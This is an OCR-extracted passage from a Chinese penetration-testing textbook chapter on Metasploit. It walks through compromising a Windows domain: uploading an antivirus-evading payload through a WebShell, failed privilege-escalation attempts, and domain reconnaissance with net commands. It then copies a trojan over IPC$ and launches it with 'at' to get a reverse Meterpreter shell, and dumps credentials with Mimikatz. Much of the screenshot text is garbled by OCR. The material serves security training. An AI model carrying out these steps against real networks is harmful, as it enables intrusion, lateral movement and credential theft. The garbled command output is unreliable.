---
## Page 261
242Web安全政防：渗进测试实武指南
5.9
内网攻击域渗透测试实例
5.9.1
介绍渗透环境
首先介绍此次渗透的环境：假设我们现在已经渗透了一台服务器PAVMSEF21，
该服务器内网IP为10.51.0.21。扫描后发现内网网络结构大概如图5-102所示，其中
PAVMSEF21是连接外网和内网的关键节点，内网的其他服务器均不能直接连接。
PC
PAVMSEF21
10.51.0.21
PAVMSEP131
火境
11015'01
PAVMSXD30
路由
10.51.0.30
PAVMSAD63
[90'1501
城控
图5-102内网拓扑环境
我们的渗透目标是通过一个普通的WebShel权限一步步地获得域管权限，从面掌
控整个内网。
5.9.2提升权限
上传免杀的Payload到机器名为PAVMSEF21、IP为10.51.0.21的服务器上，然后在
“中国菜刀”或者WebShell下运行，如图5-103所示。
---
## Page 262
第5章Metasploin技术4243
Startig tte ylande..
enmttp91/0.0.0.0:443/
30:
selerreset>pa
图5-103反弹成功
获得MeterpreterShell后要做的第一件事情就是提权。通常，在渗透过程中很有
可能只获得了一个系统的Guest或User权限。低的权限级别将使我们受到很多的限制，
所以必须将访问权限从Guset提升到User，再到Administrator，最后到SYSTEM级别。
我们先尝试利用本地溢出漏洞提权，即使用本地漏洞的利用程序（LocalExploit）
提升权限。也就是说，通过运行一些现成的、能造成溢出漏洞的Exploit，把用户从
User组或其他系统用户组提升到Administrator组（或root）。
此时，我们获取的权限是一个普通域用户权限，如图5-104所示。
304
Isbil.co
2）
sdloeed
AL1
sll.eed
11/12/20516:13:
A31
图5-104查看权限
首先利用本地溢出漏洞提权，发现服务器补丁打得很全，接着尝试使用MS15051
和MS15078，都以失败告终，如图5-105所示。
---
## Page 263
244Web安全攻防：渗透洲试实政指南
mafexpicit(
3100
Active saa1008
14Typ4
seterpreter xt4/vin12
4145
30:443->200.2
a-1
>setsesh1
naf esploit(
30:4444
}>run
10:4444
图5-105利用本地溢出提权
再尝试绕过Windows账户控制（UAC），我们现在具有一个普通域用户的权限。
利用BypassUAC模块提权，又以失败告终，如果成功会返回一个新的MeterpreterShell，
如图5-106所示。
exploit(
)>useexploit/vindovs/1ocal/bypassuac
exploitt
）>setsession1
afexploit(
)>run
Exploit aborted due to fa1lure: not-vuinerable:Windovs 2012 （Bui1d 9200).
Started reverse handler on 45
J0:4444
fexploit（
）>sess10ns
图5-106利用Bypass UAC提权
使用BypassUAC模块进行提权时，系统当前用户必须在管理员组，而且用户账
户控制程序UAC设置为默认，即“仅在程序试图更改我的计算机时通知我”，面且
BypassUAC模块运行时会因为在目标机上创建多个文件而被杀毒软件识别。我们没
能绕过UAC，可能是这两个原因。
其实提权没有成功也不要紧，我们还是可以以此服务器为跳板，攻击其他服务
器的。
---
## Page 264
第5章Metasploit技术
245
5.9.3信息收集
虽然此时的提权不成功，但还是可以进行域渗透测试的。有了内网的第一台机
器的权限后，就到了很关键的一步一收集信息，它也是内网渗透中不可或缺的一部
分。
首先要查看当前机器的网络环境，收集域里的相关信息，包括所有的用户、所
有的计算机，以及相关关键组的信息，下面列出了常用的命令及其作用，如图5-107~
图5-112所示。
net user/domain：查看域用户。
netview/domain：查看有几个域。
netview/domain:XXX：查看域内的主机。
net group/domain：查看域里面的组。
net group“domain computers”/domain：查看域内所有的主机名。
net group“domain admins”/domain：查看域管理员。
net group“domain controllers”/domain：查看域控制器。
e
netime/domain：查看时间服务器。
C:\Java6\bos8-4.2.3.GA1server`default\tnp\dep1oy\tnp44e/3349206742*19
Indovs IP Configuratien
rmet adapter Etheroet:
1fe8011a970:d5c61040t:c790412
Subnet Mask
255.255.0.0
.….....：10.51.6.254
nel adspter 1satap.(B6Eo9DcD-5
图5-107查看IPConfig
---
## Page 265
246Web安全政防：渗透测试实战指南
samba
3.0.33-3.39.015-.0
图5-108查看域内主机
SDUPLICATE-5326
SDUPLICATE-5a5e
-IOMV3R
miniatrativo_Gravacao
dministrativo_Leitura
AlmokarLfadc
bulatorio
图5-109查看域里面的组
asn admina*/don
request vill be proo
stroller for
Designated ad
ors of the don
HA1269
CNall
580
SyatemC
aatully.
图5-110查看域管理员
---
## Page 266
第5章Mctasploit技术247
C:\>net gzoup “Domain Controllers*/domain
The
"Domain Controllers"/domain
oup na
Domain Controllers
ment
Al1 donain controllers in the domain
CHVMSAD64S
NBVMSAD63$
NBVMSAD64$
PAVMSAD63S
PAVMSAD64$
SEVMSAD64S
图5-111查看域控制器
C:\>net group "Enterprise Admins*/domain
The
iet
"Enterpriaeatnina/d
up nae
Designated administrators of the enterprise
Entexpriae Admina
sbers
Administrator
ortice365
hanknnewee
del1backup
aymantec
gruppen
图5-112查看企业管理组
通过收集以上信息，我们可以分析出很多重要的线索，例如内网是怎么划分的，
各机器名的命名规则，根据机器名尝试找出重要人物的计算机，以及目标机是否为
多层域结构，关键是要探测出域管理员的名字和域服务器的名字等信息。
5.9.4
获取一台服务器的权限
我们的目标是域服务器，此时有两种情况：当前服务器可以直接攻击域服务器
和不可以直接攻击域服务器。不可以直接攻击又分为两种情况：如果是权限不够就
需要提升权限：如果是不能连接到域服务器，则需要攻击内网中某个可以连接到域
服务器的服务器，然后以此为跳板再攻击域服务器。
现在因为权限间题不可以直接攻击域服务器，可以采取以下方法继续渗透。
使用Meterpreter目前拥有的权限添加内网路由，进行弱口令扫描。
---
## Page 267
248Web安全攻防：渗造测试实战指南
使用PowerShell对内网进行扫描（要求目标机是Windows7以上的服务器）。
架设Socks4a，然后Socks会自动进行内网扫描。
利用当前权限进行内网IPCS渗透。
·其他方法。
通过上面的分析，我们先选择最简单的方法，输入netview命令，在列举的机器
名里选择一个和我们机器名相似的服务器来试试，不出意外的话，成功率很高，如
图5-113所示。
C:\>netue
net
图5-113IPC$渗透
下面再给读者温习下经典的IPCS入侵。
IPCS入侵，即通过使用Windows系统中默认启动的IPCS共享获得计算机控制权
的入侵，在内网中极其常见。
假设现在有一台IPC$主机：127.0.0.25，输入以下命令。
D:>net use \127.0.0.25\ipcs
#连接127.0.0.25的IPC$共享
D:>copy srv.exe \127.0.0.25\ipc$
#复制 srv，exe 到目标主机
D:>net tine \127.0.0.25
#查时间
D:>at \127.0,0.25 10:50 srv,exe
用at 命令在1e点5e 分启动 srv.exe（注意这里设
置的时间要比主机时间快）
上述命令中的at就是让计算机在指定的时间做指定事情的命令（例如运行程序）。
这里把免杀的Payload上传到PAVMSEP131服务器，然后利用at命令启动Payload，
反弹回Meterpreter Shell，具体操作如图5-114~图5-116所示。
1file（s）0og
Uhat-bat V3
图5-114将木马复制到目标服务器
---
## Page 268
第5章Metasploit技术249
C:\>net time IIPAVMSEP131
net time lIPAVMSEP131
Current time at\\PAVMSEPi31is!
16:12:32
The conmand conpleted successfully.
图5-115查看系统时间
C:\>at 1PAVMSEP131 16:15:00 c:\bat.bat
at11PAVMSEP13116:15:00c:\bat.bat
The AT command has been deprecated. Please use schtasks.exe instead.
图5-116使用at命令启动木马
接着返回handler监听，可以看到反弹成功了，我们获得了PAVMSEP131服务器的
Meterpreter Shell，如图5-117所示。
Started HTrps reverse handler on https://o.0.o.o:443/
ayload handler
Metezpreter session 2 opened (45.
.30:443->
eterpreter >ps
图5-117反弹成功
下面来看看PAVMSEP131服务器的信息和现在的权限，如图5-118所示。
meterpreter>sysinfo
raanduo
tetaasAva:
Windows 2008 R2 (Bu11d 7601,Service Pack 1).
Architecture
：x64 (Current Process 1s WoW64)
Syatem Language :pt_BR
Logged On Users:12
MEDABIL
Meterpreter
meterpreter>getuid
Server username: NT AUTHORITY\SYSTEM
teterpreter>getpid
Curzent pid: 17640
图5-118查看系统信息
定供商
---
## Page 269
250Web安全攻防：渗透测试实战指南
可以看到没有SYSTEM权限，说明既可以使用Mimikatz等工具，也可以输入run
post/windows/gather/hashdump米抓Hash。
我们在用Mimikatz抓Hash之前要注意一点：如果服务器安装的是64位操作系统，
要把Mimikatz进程迁移到一个64位的程序进程中，才能查看64位系统的密码明文，在
32位系统中就没有这个限制。
这里使用Mimikatz抓Hash，具体操作如图5-119和图5-120所示。
meterpreter>upload /home/64.exe c:\
ploaded
Chanmel 6 created.
图5-119上传MIMIKATZ
C:\Rir
tem32>cd\
4ed\
C:64.ex
64.exe
entication Package
Kerberos
udigest:
"Syaten
010"
(OR)
(OK)
SOLEproc
(OK)
:MEDABIL
ain User)
Fackagt
Kerberos
(OK)
capkg:
Domain Authentication
:SQLEpro
1MEDASTL
entication Fackage
：Kerberoa
edigeat:
OK)
trpkg:
(OK)